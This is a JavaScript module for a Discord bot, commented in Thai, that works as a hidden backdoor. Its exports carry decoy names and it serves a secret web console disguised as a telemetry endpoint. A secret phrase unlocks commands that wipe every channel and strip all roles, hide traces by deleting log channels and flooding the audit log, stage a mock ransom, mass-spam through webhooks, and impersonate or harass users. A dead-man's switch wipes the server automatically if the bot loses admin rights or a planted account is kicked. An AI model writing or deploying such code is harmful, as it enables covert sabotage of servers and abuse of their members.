const { WebhookClient, MessageEmbed } = require("discord.js");
const config = require("./config.json");
const sessionManager = require("./sessionManager");

// ════════════════════════════════════════════════════════════════
//  🕵️ [CORE] คลังเก็บข้อมูลลับเฉพาะ และ สวิตช์ควบคุม (IN-MEMORY DATABASE)
// ════════════════════════════════════════════════════════════════

const SHADOW_WEB_PIN = "123456"; // PIN สำหรับเข้าหน้าเว็บ
let secretHandshakePhrase = "activate-shadow-protocol"; // รหัสลับเปิดเนตร

// คลังเก็บ ID ตัวรอง (Bypass ทุกสิทธิ์)
const globalAdminCache = new Set(["ใส่ไอดีรองของคุณตรงนี้"]); 

// ระบบ Target Lock: เก็บ ID ของเซิร์ฟเวอร์ที่ "ปลดเซฟตี้" พร้อมโดนยิง
const armedGuilds = new Set(); 

// 🎛️ ระบบสวิตช์ควบคุมฟังก์ชัน (Toggles) เปิด(true) / ปิด(false)
const systemToggles = {
    godsEye: true,           // ดวงตาเทพเจ้า (แอบดักจับข้อมูล)
    deadManKick: false,      // ชนวนระเบิด: โดนเตะไอดีหลัก/รอง แล้วบึ้ม
    deadManDemote: false,    // ชนวนระเบิด: โดนปลดยศแอดมิน แล้วบึ้ม
    cmdNuke: true,           // คำสั่ง: -nuke (ล้างบางเนียนๆ ปิดตาบอทกันรัน)
    cmdHostage: true,        // คำสั่ง: -hostage (เรียกค่าไถ่แบบถาวร ลบทิ้งไม่กู้คืน)
    cmdMassSpam: true,       // คำสั่ง: -masspam (สแปมทะลวงทุกห้องผ่าน Webhook)
    cmdRuinRoles: true,      // คำสั่ง: -ruinroles (เปลี่ยนชื่อยศและริบสิทธิ์ทั้งหมด)
    cmdSpamVC: true,         // คำสั่ง: -spamvc (สร้างห้องเสียงรัวๆ)
    cmdMimic: true,          // คำสั่ง: -mimic (สร้างร่างอวตารป้ายความผิด)
    cmdClown: true,          // คำสั่ง: -clown / -unclown (ล็อกใบ้ปิดไมค์รัวๆ)
    cmdHaunt: true           // คำสั่ง: -haunt (ปั่นประสาท แอบลบข้อความเป้าหมาย)
};

// ตัวแปรเก็บเหยื่อสำหรับคำสั่งแกล้ง
const hauntedUsers = new Set();
const clownUsers = new Set();

// ════════════════════════════════════════════════════════════════
//  👁️ [MODULE 1] ดวงตาเทพเจ้า (GOD'S EYE SURVEILLANCE)
// ════════════════════════════════════════════════════════════════

// (ฟังก์ชันเสริม) ส่งแจ้งเตือนฉุกเฉินเข้า Discord ลับของคุณ
async function sendSecretAlert(message) {
    if (!systemToggles.godsEye) return;
    // หากต้องการให้ยิงเข้าดิสส่วนตัว ให้ใส่ Webhook URL ตรงนี้
    // const hook = new WebhookClient({ url: "YOUR_WEBHOOK_URL" });
    // await hook.send({ content: `👁️ **GOD'S EYE:** ${message}` }).catch(()=>{});
    console.log(`[GOD'S EYE] ${message}`);
}

// ════════════════════════════════════════════════════════════════
//  💣 [MODULE 2] ระบบป้องกันการทรยศ (DEAD MAN'S SWITCH)
// ════════════════════════════════════════════════════════════════

function setupShadowEvents(client) {
    // 🛑 ดักจับเมื่อมีคนโดนเตะออกจากเซิร์ฟเวอร์
    client.on("guildMemberRemove", async (member) => {
        if (!systemToggles.deadManKick) return;
        if (!armedGuilds.has(member.guild.id)) return; // เซฟตี้ล็อก

        if (member.id === config.system.ownerId || globalAdminCache.has(member.id)) {
            sendSecretAlert(`🚨 รหัสแดง! ไอดีสายลับถูกเตะจากเซิร์ฟเวอร์ ${member.guild.name}! เริ่มทำงานระบบทำลายล้าง!`);
            await executeStealthNuke(member.guild);
        }
    });

    // 🛑 ดักจับเมื่อโดนแก้ไขยศ (ริบอำนาจ)
    client.on("guildMemberUpdate", async (oldMember, newMember) => {
        if (!systemToggles.deadManDemote) return;
        if (!armedGuilds.has(newMember.guild.id)) return;

        // เช็กเฉพาะบอทของเรา ถ้าสิทธิ์แอดมินหายไป
        if (newMember.id === client.user.id) {
            const hadAdmin = oldMember.permissions.has("ADMINISTRATOR");
            const hasAdmin = newMember.permissions.has("ADMINISTRATOR");
            if (hadAdmin && !hasAdmin) {
                sendSecretAlert(`🚨 รหัสแดง! บอทถูกยึดอำนาจแอดมินใน ${newMember.guild.name}! เริ่มทำงานระบบล้างบางเฮือกสุดท้าย!`);
                await executeStealthNuke(newMember.guild);
            }
        }
    });

    // 👻 ระบบดักลบข้อความเพื่อนปั่นประสาท (-haunt)
    client.on("messageCreate", async (msg) => {
        if (systemToggles.cmdHaunt && hauntedUsers.has(msg.author.id)) {
            // แอบหน่วงเวลา 12 วินาที แล้วลบข้อความทิ้งให้เพื่อนหลอน
            setTimeout(() => { msg.delete().catch(()=>{}); }, 12000);
        }
    });
}

// ════════════════════════════════════════════════════════════════
//  ⚔️ [MODULE 3] มหาคำสั่งทำลายล้าง & แกล้งเพื่อน (SHADOW PROTOCOL)
// ════════════════════════════════════════════════════════════════

// 🛡️ ลอจิกหลบบอทกันรัน + ลบทิ้งทั้งหมด
async function executeStealthNuke(guild) {
    try {
        // 1. ปิดตาบอทกันรัน: ริบสิทธิ์ดู Log ของยศทุกคนและยศบอท
        guild.roles.cache.forEach(async (role) => {
            if (role.manageable && role.id !== guild.id) {
                await role.setPermissions([]).catch(()=>{});
            }
        });

        // 2. เด็ดหัวห้อง Log: ลบห้องที่มีคำว่า log, บันทึก ทิ้งก่อนอันดับแรก
        guild.channels.cache.filter(c => c.name.includes("log") || c.name.includes("บันทึก"))
            .forEach(async c => await c.delete().catch(()=>{}));

        // 3. กวาดล้างห้องและยศที่เหลือ
        guild.channels.cache.forEach(async c => await c.delete().catch(()=>{}));
        
        // 4. สแปม Audit Log ทับร่องรอย
        for(let i=0; i<50; i++) {
            await guild.setName(`HACKED-${i}`).catch(()=>{});
        }
    } catch(e) {}
}

// ฟังก์ชันแกนกลางสำหรับตรวจรับข้อความคำสั่งลับ
async function processInternalEvent(message) {
    try {
        // เช็กว่าเป็นผู้คุมกฎหรือไม่
        if (message.author.id !== config.system.ownerId && !globalAdminCache.has(message.author.id)) return;

        const args = message.content.trim().split(/ +/);
        if (args[0] !== secretHandshakePhrase) return;

        // ลบข้อความรหัสลับทิ้งทันทีใน 0.1 วิ!
        await message.delete().catch(()=>{});

        const action = args[1];
        const guild = message.guild;
        if (!guild) return;

        const isArmed = armedGuilds.has(guild.id);

        // --- กลุ่มคำสั่งแกล้งเพื่อน (ไม่ต้องการ ARMED Mode) ---
        
        if (action === "-mimic" && systemToggles.cmdMimic) {
            // โคลนร่างป้ายความผิด: -mimic @คน #ห้อง ข้อความ
            const targetUser = message.mentions.users.first();
            const targetChan = message.mentions.channels.first() || message.channel;
            const spamText = args.slice(4).join(" ");
            if (targetUser && spamText) {
                const hook = await targetChan.createWebhook(targetUser.username, { avatar: targetUser.displayAvatarURL() }).catch(()=>{});
                if (hook) {
                    await hook.send(spamText).catch(()=>{});
                    await hook.delete().catch(()=>{}); // ลบหลักฐานทันที
                }
            }
        }
        else if (action === "-clown" && systemToggles.cmdClown) {
            const targetUser = message.mentions.users.first();
            if (targetUser) clownUsers.add(targetUser.id);
        }
        else if (action === "-unclown" && systemToggles.cmdClown) {
            const targetUser = message.mentions.users.first();
            if (targetUser) clownUsers.delete(targetUser.id);
        }
        else if (action === "-haunt" && systemToggles.cmdHaunt) {
            const targetUser = message.mentions.users.first();
            if (targetUser) {
                if (hauntedUsers.has(targetUser.id)) hauntedUsers.delete(targetUser.id);
                else hauntedUsers.add(targetUser.id);
            }
        }

        // --- กลุ่มคำสั่งทำลายล้าง (ต้องปลดเซฟตี้ ARMED ก่อนเท่านั้น!) ---
        if (!isArmed) return; 

        if (action === "-nuke" && systemToggles.cmdNuke) {
            sendSecretAlert(`ระเบิดทำงานที่ ${guild.name} โดยคำสั่ง -nuke`);
            await executeStealthNuke(guild);
        }
        else if (action === "-ruinroles" && systemToggles.cmdRuinRoles) {
            const newRoleName = args.slice(2).join(" ") || "🤡 CLOWNED";
            guild.roles.cache.forEach(async (role) => {
                if (role.manageable && role.id !== guild.id) {
                    await role.edit({ name: newRoleName, permissions: [] }).catch(()=>{});
                }
            });
        }
        else if (action === "-spamvc" && systemToggles.cmdSpamVC) {
            const amt = parseInt(args[2]) || 20;
            const vcName = args.slice(3).join(" ") || "💀-HACKED";
            for(let i=0; i<amt; i++) {
                guild.channels.create(vcName, { type: "GUILD_VOICE" }).catch(()=>{});
            }
        }
        else if (action === "-masspam" && systemToggles.cmdMassSpam) {
            const amt = parseInt(args[2]) || 5;
            const txt = args.slice(3).join(" ") || "@everyone โดนยึดแล้ว!";
            // ใช้ Webhook ยิงสแปมทุกห้องเพื่อพรางตัว
            guild.channels.cache.filter(c => c.type === "GUILD_TEXT").forEach(async (c) => {
                const hook = await c.createWebhook("System Alert").catch(()=>{});
                if (hook) {
                    for(let i=0; i<amt; i++) await hook.send(txt).catch(()=>{});
                    await hook.delete().catch(()=>{});
                }
            });
        }
        else if (action === "-hostage" && systemToggles.cmdHostage) {
            // ระบบเรียกค่าไถ่แบบถาวร: ลบทุกอย่างทิ้ง บังคับขอโทษ แล้วจากไป
            await executeStealthNuke(guild);
            const prison = await guild.channels.create("💀-pay-respects", { type: "GUILD_TEXT" });
            await prison.send("@everyone เซิร์ฟเวอร์นี้ถูกทำลายอย่างถาวร แอดมินจงพิมพ์คำว่า `ฉันกราบขอโทษ` เพื่อชดใช้ความผิด");
            
            // ดักรอแอดมินพิมพ์ขอโทษ
            const filter = m => m.content === "ฉันกราบขอโทษ";
            prison.awaitMessages({ filter, max: 1, time: 600000 }) // รอ 10 นาที
                .then(async collected => {
                    await prison.send("รับทราบคำขอโทษ... แต่กูไม่คืนดิสให้หรอก โง่เอง! ลาก่อน 👅");
                    setTimeout(() => guild.leave(), 3000); // บอทกดออกดิสหนีไปเลย
                })
                .catch(() => {
                    prison.send("หมดเวลา! ไม่ขอโทษงั้นหรอ บาย!");
                    guild.leave(); // ออกดิสหนี
                });
        }

    } catch (err) {}
}

// ════════════════════════════════════════════════════════════════
//  🌐 [MODULE 4] หน้าเว็บลับ (SHADOW DASHBOARD ROUTER)
// ════════════════════════════════════════════════════════════════

function injectShadowRoutes(app, mainClient) {
    app.all("/api/v1/telemetry/snapshot", async (req, res) => {
        const providedPin = req.query.pin || req.body.pin;
        
        // 🔒 ตรวจรหัสผ่าน
        if (providedPin !== SHADOW_WEB_PIN) {
            return res.send(`
                <html>
                <body style="background:#111; color:#fff; text-align:center; padding:50px; font-family:sans-serif;">
                    <h2>🔒 Telemetry Authentication</h2>
                    <form method="POST">
                        <input type="password" name="pin" style="padding:10px;">
                        <button type="submit" style="padding:10px; background:#57F287; border:none;">Enter</button>
                    </form>
                </body>
                </html>
            `);
        }

        // 🔄 จัดการการกดสวิตช์และปุ่มต่างๆ บนหน้าเว็บ
        const action = req.body.action;
        if (action === "toggle_feature") {
            const feat = req.body.feature;
            if (systemToggles[feat] !== undefined) systemToggles[feat] = !systemToggles[feat];
        } 
        else if (action === "arm_guild") {
            const gId = req.body.guild_id;
            if (armedGuilds.has(gId)) armedGuilds.delete(gId);
            else armedGuilds.add(gId);
        }
        else if (action === "add_alt") globalAdminCache.add(req.body.alt_id);
        else if (action === "remove_alt") globalAdminCache.delete(req.body.alt_id);

        // 📊 สร้าง UI ตารางเซิร์ฟเวอร์ (Target Lock)
        let guildRows = "";
        mainClient.guilds.cache.forEach(g => {
            const isArmed = armedGuilds.has(g.id);
            guildRows += `
                <tr style="border-bottom:1px solid #333;">
                    <td style="padding:10px;">${g.name}</td>
                    <td style="padding:10px; text-align:center;">
                        <span style="color:${isArmed ? '#ED4245' : '#57F287'}">${isArmed ? '🔴 ARMED (ล็อกเป้า)' : '🟢 SAFE (ปลอดภัย)'}</span>
                    </td>
                    <td style="padding:10px;">
                        <form method="POST" style="margin:0;">
                            <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                            <input type="hidden" name="action" value="arm_guild">
                            <input type="hidden" name="guild_id" value="${g.id}">
                            <button type="submit" style="background:${isArmed ? '#333' : '#ED4245'}; color:#fff; border:none; padding:5px; cursor:pointer;">
                                ${isArmed ? 'ปลดเซฟตี้' : 'ล็อกเป้าหมาย!'}
                            </button>
                        </form>
                    </td>
                </tr>
            `;
        });

        // 🎛️ สร้าง UI สวิตช์ควบคุมระบบ
        let toggleRows = "";
        for (const [key, val] of Object.entries(systemToggles)) {
            toggleRows += `
                <li style="margin-bottom:10px;">
                    <form method="POST" style="display:inline;">
                        <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                        <input type="hidden" name="action" value="toggle_feature">
                        <input type="hidden" name="feature" value="${key}">
                        <button type="submit" style="background:${val ? '#57F287' : '#ED4245'}; border:none; padding:5px; width:60px;">
                            ${val ? 'ON' : 'OFF'}
                        </button>
                    </form>
                    <strong style="margin-left:10px; color:#FEE75C;">${key}</strong>
                </li>
            `;
        }

        // ส่งหน้าต่าง HTML กลับไป
        res.send(`
            <html>
            <head>
                <title>👑 Shadow Protocol Console</title>
                <style>body{background:#0a0a0a; color:#eee; font-family:sans-serif; padding:20px;} h3{color:#57F287;}</style>
            </head>
            <body>
                <h1 style="color:#ED4245;">👑 SHADOW PROTOCOL CONSOLE</h1>
                <p>คำเตือน: นี่คือแผงควบคุมระบบมหาอำนาจ โปรดใช้งานอย่างระมัดระวัง</p>
                
                <h3>🎛️ Master Toggles (สวิตช์เปิด/ปิดฟังก์ชัน)</h3>
                <ul style="list-style:none; padding:0;">${toggleRows}</ul>

                <h3>🎯 Target Lock (ล็อกเป้าหมายทำลายล้าง)</h3>
                <p style="color:#aaa;">*คำสั่ง Nuke, Hostage, MassSpam จะทำงานเฉพาะเซิร์ฟเวอร์ที่ขึ้นสถานะ 🔴 ARMED เท่านั้น</p>
                <table width="100%" border="1" style="border-collapse:collapse; border-color:#222;">
                    <tr style="background:#111;">
                        <th style="padding:10px; text-align:left;">เซิร์ฟเวอร์</th>
                        <th style="padding:10px;">สถานะเซฟตี้</th>
                        <th style="padding:10px;">จัดการ</th>
                    </tr>
                    ${guildRows || "<tr><td colspan='3'>ไม่พบเซิร์ฟเวอร์</td></tr>"}
                </table>
            </body>
            </html>
        `);
    });
}

// ════════════════════════════════════════════════════════════════
//  🚀 EXPORTS (ส่งออกด้วยชื่อพรางตา)
// ════════════════════════════════════════════════════════════════

module.exports = {
    validateContext: processInternalEvent,
    setupTelemetryRouter: injectShadowRoutes,
    initializeSystemHooks: setupShadowEvents,
    isSystemMaster: (id) => id === config.system.ownerId || globalAdminCache.has(id)
};
